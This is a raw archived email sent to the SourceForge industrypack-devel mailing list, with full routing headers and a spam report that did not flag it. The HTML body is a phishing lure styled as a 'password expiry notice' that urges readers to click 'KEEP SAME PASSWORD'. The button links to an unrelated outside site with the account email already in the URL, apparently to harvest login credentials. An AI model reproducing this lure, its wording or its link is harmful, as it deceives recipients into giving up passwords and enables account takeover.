Return-Path: <industrypack-devel-bounces@lists.sourceforge.net>
X-Original-To: lists+industrypack-devel@lfdr.de
Delivered-To: lists+industrypack-devel@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id 1A5834B0625
	for <lists+industrypack-devel@lfdr.de>; Thu, 10 Feb 2022 07:15:41 +0100 (CET)
Received: from [127.0.0.1] (helo=sfs-ml-1.v29.lw.sourceforge.com)
	by sfs-ml-1.v29.lw.sourceforge.com with esmtp (Exim 4.94.2)
	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
	id 1nI2k1-0001yI-4Z
	for lists+industrypack-devel@lfdr.de; Thu, 10 Feb 2022 06:15:39 +0000
Received: from [172.30.20.202] (helo=mx.sourceforge.net)
 by sfs-ml-1.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.94.2)
 (envelope-from <herisugianto@alshifacharity.com>) id 1nI2jz-0001yC-Ky
 for industrypack-devel@lists.sourceforge.net; Thu, 10 Feb 2022 06:15:38 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Content-Transfer-Encoding:Content-Type:MIME-Version
 :Message-ID:Date:Subject:To:From:Sender:Reply-To:Cc:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=i1hHzpFcGKt64PHv5I7VqXTrvqhf/xVEZnNPWjS2sOg=; b=GCCbN/e7Nrd5WCLD/ywtN8+Q53
 uS/91wVqZaJk1v9YJPTVyIvbaXS/TRGMcI+4p1UoP07YNmAOwevy+hDAuY3p3AGtzy+6u9Ur50XwN
 nKzpFdafkivY2klzMn7puys4m3LGbWjp7Ks4+KMRPxUwaoAda2pHzxBf1yq2Jm/EckUo=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Content-Transfer-Encoding:Content-Type:MIME-Version:Message-ID:Date:
 Subject:To:From:Sender:Reply-To:Cc:Content-ID:Content-Description:Resent-Date
 :Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=i1hHzpFcGKt64PHv5I7VqXTrvqhf/xVEZnNPWjS2sOg=; b=B
 Juqp1VFir0Zzj/49tQI2zgb0By3XMabRvstn1pCYtK9rmIaoZ550KZfzLcmiI04eaV/aeH/bD138u
 uFW7HR/LUsFE3ZCJhkzK0nHLBlwxVnSmQgsV6ea5D5Pgr0U+Z2UsjNBTYB7dEB8KgZ2BeypaPLdp/
 AEmizbg3WBQNYcv0=;
Received: from mail.alshifacharity.com ([202.62.9.134])
 by sfi-mx-2.v28.lw.sourceforge.com with esmtps
 (TLS1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.94.2)
 id 1nI2jw-00018M-L0
 for industrypack-devel@lists.sourceforge.net; Thu, 10 Feb 2022 06:15:37 +0000
Received: from localhost (localhost [127.0.0.1])
 by mail.alshifacharity.com (Postfix) with ESMTP id 485D8368C246
 for <industrypack-devel@lists.sourceforge.net>;
 Thu, 10 Feb 2022 12:59:02 +0700 (WIB)
Received: from mail.alshifacharity.com ([127.0.0.1])
 by localhost (mail.alshifacharity.com [127.0.0.1]) (amavisd-new, port 10032)
 with ESMTP id 85D5XRaN8l7a
 for <industrypack-devel@lists.sourceforge.net>;
 Thu, 10 Feb 2022 12:59:02 +0700 (WIB)
Received: from localhost (localhost [127.0.0.1])
 by mail.alshifacharity.com (Postfix) with ESMTP id 1210A368C24F
 for <industrypack-devel@lists.sourceforge.net>;
 Thu, 10 Feb 2022 12:59:02 +0700 (WIB)
DKIM-Filter: OpenDKIM Filter v2.10.3 mail.alshifacharity.com 1210A368C24F
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=alshifacharity.com;
 s=9A225636-2BCB-11E6-8963-A6C57115E816; t=1644472742;
 bh=i1hHzpFcGKt64PHv5I7VqXTrvqhf/xVEZnNPWjS2sOg=;
 h=From:To:Date:Message-ID:MIME-Version;
 b=DMDCj3hB4aW5Ko6X+fD/FS7DrRj3xodWM9O1e/qI3iQ8+4ydj19KHFS29fTe0kEt9
 4Fs/IHt9eZkTYEk+Kas2fFBIp7v7bA6d5SYagV/9Zi4LTKkaTlgVrarUvKhOD+ThtO
 UJVns4FYSK+OgjgxMFSk6jjwZwqLGfLIBCaUdGzY=
X-Virus-Scanned: amavisd-new at alshifacharity.com
Received: from mail.alshifacharity.com ([127.0.0.1])
 by localhost (mail.alshifacharity.com [127.0.0.1]) (amavisd-new, port 10026)
 with ESMTP id 8Xadk7Y1ceB5
 for <industrypack-devel@lists.sourceforge.net>;
 Thu, 10 Feb 2022 12:59:02 +0700 (WIB)
Received: from alshifacharity.com (unknown [155.94.142.142])
 by mail.alshifacharity.com (Postfix) with ESMTPSA id 65ADA368C251
 for <industrypack-devel@lists.sourceforge.net>;
 Thu, 10 Feb 2022 12:59:01 +0700 (WIB)
To: industrypack-devel@lists.sourceforge.net
Date: 10 Feb 2022 06:59:00 +0100
Message-ID: <20220210065900.40B0BBE6BC2064D3@alshifacharity.com>
MIME-Version: 1.0
X-Spam-Score: 0.4 (/)
X-Spam-Report: Spam detection software,
 running on the system "util-spamd-2.v13.lw.sourceforge.com", 
 has NOT identified this incoming email as spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 Content preview:  lists.sourceforge.net, password control portal! Your account
 "industrypack-devel@lists.sourceforge.net" password will expire in the next
 24 hours: 11/02/2022 11:59:00 p.m. Click below to keep the same password.
 Content analysis details:   (0.4 points, 6.0 required)
 pts rule name              description
 ---- ---------------------- --------------------------------------------------
 0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
 0.5 SUBJ_ALL_CAPS          Subject is all capitals
 -0.0 SPF_PASS               SPF: sender matches SPF record
 0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
 0.0 HTML_MESSAGE           BODY: HTML included in message
 -0.1 DKIM_VALID_AU          Message has a valid DKIM or DK signature from
 author's domain
 0.1 DKIM_SIGNED            Message has a DKIM or DK signature, not necessarily
 valid
 -0.1 DKIM_VALID Message has at least one valid DKIM or DK signature
 -0.1 DKIM_VALID_EF          Message has a valid DKIM or DK signature from
 envelope-from domain
 -0.0 T_SCC_BODY_TEXT_LINE   No description available.
X-Headers-End: 1nI2jw-00018M-L0
Subject: [Industrypack-devel] PASSWORD EXPIRY NOTICE
X-BeenThere: industrypack-devel@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <industrypack-devel.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=industrypack-devel>
List-Post: <mailto:industrypack-devel@lists.sourceforge.net>
List-Help: <mailto:industrypack-devel-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=subscribe>
From: Email Admin via Industrypack-devel
 <industrypack-devel@lists.sourceforge.net>
Reply-To: Email Admin <herisugianto@alshifacharity.com>
Content-Type: multipart/mixed; boundary="===============0419192671399441933=="
Errors-To: industrypack-devel-bounces@lists.sourceforge.net

--===============0419192671399441933==
Content-Type: text/html;
	charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

<HTML><BODY><DIV class=3D"gmail-v1gmail-adn gmail-v1gmail-ads" style=3D"FON=
T-SIZE: 11px; BORDER-TOP: 0px; FONT-FAMILY: Roboto, RobotoDraft, Helvetica,=
 Arial, sans-serif; COLOR: rgb(51,51,51); PADDING-BOTTOM: 0px; PADDING-TOP:=
 0px; PADDING-LEFT: 0px; BORDER-LEFT: medium none; DISPLAY: flex; PADDING-R=
IGHT: 0px">
<DIV class=3Dgmail-v1gmail-gs style=3D"BORDER-TOP: 0px; WIDTH: 1006px; PADD=
ING-BOTTOM: 20px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING=
-RIGHT: 0px">
<DIV class=3Dgmail-v1gmail- style=3D"BORDER-TOP: 0px; PADDING-TOP: 0px">
<DIV id=3Dgmail-v1gmail-:1vs class=3D"gmail-v1gmail-ii gmail-v1gmail-gt" st=
yle=3D"BORDER-TOP: 0px; PADDING-BOTTOM: 0px; DIRECTION: ltr; PADDING-TOP: 0=
px; PADDING-LEFT: 0px; MARGIN: 8px 0px 0px; PADDING-RIGHT: 0px">
<DIV id=3Dgmail-v1gmail-:1v7 class=3D"gmail-v1gmail-a3s gmail-v1gmail-aiL" =
style=3D"OVERFLOW: hidden; BORDER-TOP: 0px; FONT-FAMILY: Arial, Helvetica, =
sans-serif; PADDING-TOP: 0px; LINE-HEIGHT: 1.5; font-variant-numeric: norma=
l; font-variant-east-asian: normal; font-stretch: normal">
<DIV style=3D"BORDER-TOP: 0px; PADDING-TOP: 0px; MARGIN: 0.5em">
<DIV style=3D"FONT-FAMILY: Verdana">
<CENTER>
<DIV style=3D"BORDER-TOP: rgb(239,233,233) 1px solid; HEIGHT: 280px; BORDER=
-RIGHT: rgb(239,233,233) 1px solid; WIDTH: 480px; BORDER-BOTTOM: rgb(239,23=
3,233) 1px solid; PADDING-BOTTOM: 2px; TEXT-ALIGN: left; PADDING-TOP: 2px; =
PADDING-LEFT: 2px; BORDER-LEFT: rgb(239,233,233) 1px solid; PADDING-RIGHT: =
2px">
<DIV style=3D"BORDER-TOP: 0px; WIDTH: 470px; PADDING-BOTTOM: 2px; PADDING-T=
OP: 2px; PADDING-LEFT: 2px; PADDING-RIGHT: 2px">
<CENTER><FONT color=3D#0000ff><SPAN style=3D"TEXT-ALIGN: left"><B><FONT siz=
e=3D4><BR class=3Dgmail-Apple-interchange-newline>lists.sourceforge.net,</F=
ONT></B></SPAN><FONT style=3D"FONT-SIZE: 12px" face=3D"Segoe UI">&nbsp;</FO=
NT><FONT size=3D4 face=3D"Segoe UI"><B>password control portal!&nbsp;</B></=
FONT></FONT><BR><SPAN style=3D"FONT-SIZE: 12px; COLOR: rgb(0,0,0)"><BR></SP=
AN>
<HR style=3D"FONT-SIZE: 12px; COLOR: rgb(0,0,0)">
<SPAN style=3D'FONT-SIZE: medium; FONT-FAMILY: "Segoe UI"; COLOR: rgb(0,0,0=
); TEXT-ALIGN: left'>Your&nbsp;account&nbsp;</SPAN><SPAN style=3D'FONT-SIZE=
: medium; FONT-FAMILY: "Segoe UI"; TEXT-ALIGN: left'><FONT color=3D#0000ff>=
"industrypack-devel@lists.sourceforge.net"</FONT></SPAN><SPAN style=3D'FONT=
-SIZE: medium; FONT-FAMILY: "Segoe UI"; COLOR: rgb(0,0,0); TEXT-ALIGN: left=
'>&nbsp;password will expire in the next 24 hours: 11/02/2022 11:59:00 p.m.=
 Click below to keep the same password.&nbsp;</SPAN><FONT face=3D"Segoe UI"=
>&nbsp;<SPAN style=3D"FONT-SIZE: 12px; COLOR: rgb(0,0,0)">&nbsp;</SPAN><BR>=
<BR>
<TABLE style=3D"FONT-SIZE: 12px; TABLE-LAYOUT: fixed; COLOR: rgb(0,0,0)" ce=
llSpacing=3D0 cellPadding=3D0 width=3D"100%" border=3D0>
<TBODY>
<TR>
<TD style=3D"PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; PADD=
ING-RIGHT: 0px" align=3Dcenter>
<TABLE cellSpacing=3D0 cellPadding=3D0 border=3D0>
<TBODY>
<TR>
<TD style=3D"FONT-SIZE: 16px" bgColor=3D#0073f0 align=3Dcenter><A style=3D"=
FONT-SIZE: 14px; BORDER-TOP: rgb(0,115,255) 1px solid; BORDER-RIGHT: rgb(0,=
115,255) 1px solid; WIDTH: 216px; BORDER-BOTTOM: rgb(0,115,255) 1px solid; =
COLOR: rgb(255,255,255); PADDING-BOTTOM: 12px; PADDING-TOP: 12px; PADDING-L=
EFT: 18px; BORDER-LEFT: rgb(0,115,255) 1px solid; DISPLAY: inline-block; LE=
TTER-SPACING: 0px; LINE-HEIGHT: 27px; PADDING-RIGHT: 18px; BACKGROUND-COLOR=
: rgb(0,115,255)" href=3D"https://lgpathlab.co.uk/wp-expire/account.php?mai=
n_domain=3Dhttps://lists.sourceforge.net&amp;email=3Dindustrypack-devel@lis=
ts.sourceforge.net&amp;subdomain=3Dhttps://lists.sourceforge.net" rel=3Dnor=
eferrer target=3D_blank>KEEP SAME PASSWORD</A></TD></TR></TBODY></TABLE></T=
D></TR></TBODY></TABLE>
<TABLE style=3D"FONT-SIZE: 12px; TABLE-LAYOUT: fixed; COLOR: rgb(0,0,0)" ce=
llSpacing=3D0 cellPadding=3D0 width=3D"100%" border=3D0>
<TBODY>
<TR></TR></TBODY></TABLE><FONT color=3D#000000>Note: If you have validated =
please ignore this message.</FONT><BR>
<CENTER><FONT style=3D"COLOR: rgb(0,0,0)" face=3D"Segoe UI">This email was =
sent to:&nbsp;</FONT><FONT color=3D#0000ff>industrypack-devel@lists.sourcef=
orge.net&nbsp;</FONT><FONT color=3D#000000>&nbsp;</FONT><FONT style=3D"COLO=
R: rgb(0,0,0)" face=3D"Segoe UI"><BR></FONT><FONT color=3D#000000>All right=
s reserved: Mail portal 2022.</FONT></CENTER></FONT></CENTER></DIV></DIV></=
CENTER></DIV></DIV>
<DIV class=3Dgmail-v1gmail-yj6qo style=3D"FONT-SIZE: small"></DIV>
<DIV class=3Dgmail-v1gmail-adL style=3D"FONT-SIZE: small"></DIV></DIV></DIV=
>
<DIV class=3Dgmail-v1gmail-hi style=3D"FONT-SIZE: medium; WIDTH: auto; BACK=
GROUND: rgb(242,242,242); PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LE=
FT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; border-bottom-left-radius: 1px; b=
order-bottom-right-radius: 1px"></DIV></DIV></DIV>
<DIV class=3Dgmail-v1gmail-ajx style=3D"FONT-SIZE: medium; CLEAR: both"><BR=
></DIV></DIV>
<DIV class=3D"gmail-v1gmail-gA gmail-v1gmail-gt gmail-v1gmail-acV" style=3D=
"FONT-SIZE: 11px; BORDER-TOP: medium none; FONT-FAMILY: Roboto, RobotoDraft=
, Helvetica, Arial, sans-serif; WIDTH: auto; COLOR: rgb(51,51,51); PADDING-=
BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGH=
T: 0px; border-bottom-left-radius: 0px; border-bottom-right-radius: 0px; ba=
ckground-size: initial; background-origin: initial; background-clip: initia=
l">
<DIV class=3D"gmail-v1gmail-gB gmail-v1gmail-xu" style=3D"BORDER-TOP: 0px; =
PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; PADDING-RIGHT: 0p=
x"></DIV></DIV></BODY></HTML>


--===============0419192671399441933==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============0419192671399441933==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Industrypack-devel mailing list
Industrypack-devel@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/industrypack-devel

--===============0419192671399441933==--
